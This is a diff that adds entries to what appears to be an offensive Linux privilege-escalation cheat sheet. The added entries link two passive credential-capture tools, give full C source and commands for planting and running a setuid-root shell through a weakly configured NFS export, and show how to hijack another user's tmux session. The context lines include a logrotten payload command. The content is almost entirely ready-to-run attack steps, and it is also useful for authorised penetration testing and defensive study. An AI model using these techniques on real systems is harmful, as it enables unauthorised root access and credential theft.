@@ -2049,6 +2049,42 @@ $ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
 $ ./logrotten -p ./payload /tmp/tmp.log
 ```
 
+- Passive Traffic Capture
+
+```
+https://github.com/DanMcInerney/net-creds
+https://github.com/lgandx/PCredz
+```
+
+- Weak NFS Privileges
+
+```
+$ showmount -e <IP address>
+$ cat shell.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+
+$ gcc shell.c -o shell
+$ sudo mount -t nfs <IP address>:/tmp /mnt
+$ cp shell /mnt
+$ chmod u+s /mnt/shell
+$ ./shell
+```
+
+- Hijack Tmux Session
+
+```
+$  ps aux | grep tmux
+$ tmux -S /<socket path>
+```
+
 - Disk Group
 
 ```
